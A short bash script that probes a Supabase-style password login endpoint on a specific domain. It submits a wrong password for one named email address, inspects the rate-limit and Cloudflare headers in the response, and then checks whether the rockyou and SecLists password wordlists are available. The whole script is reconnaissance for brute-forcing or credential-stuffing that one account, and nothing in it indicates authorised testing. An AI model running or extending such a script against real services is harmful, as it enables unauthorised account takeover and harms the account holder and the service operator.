#!/bin/bash
set -u
SUP="https://cdn.onlyfakeai.ru/auth/v1/token?grant_type=password"
KEY="<publishable-key>"
UA="Mozilla/5.0"

echo "=== direct GoTrue bad cred ==="
curl -sS -k -m 30 -A "$UA" -H "apikey: $KEY" -H 'Content-Type: application/json' \
  -d '{"email":"onlyfake@tuta.io","password":"definitely-wrong"}' \
  -o /tmp/gt.bin -D /tmp/gt.hdr -w 'HTTP %{http_code} %{time_total}s\n' "$SUP"
grep -iE '^(HTTP/|x-ratelimit|retry-after|cf-)' /tmp/gt.hdr | tr -d '\r' | head -8
head -c 300 /tmp/gt.bin; echo

echo
echo "=== wordlists available ==="
ls -la /usr/share/wordlists/ 2>/dev/null | head -10
ls /usr/share/seclists/Passwords/ 2>/dev/null | head -20
python3 - <<'EOF'
import os
for p in ["/usr/share/wordlists/rockyou.txt","/usr/share/wordlists/rockyou.txt.gz",
          "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
          "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"]:
    print(p, "EXISTS" if os.path.exists(p) else "-")
EOF
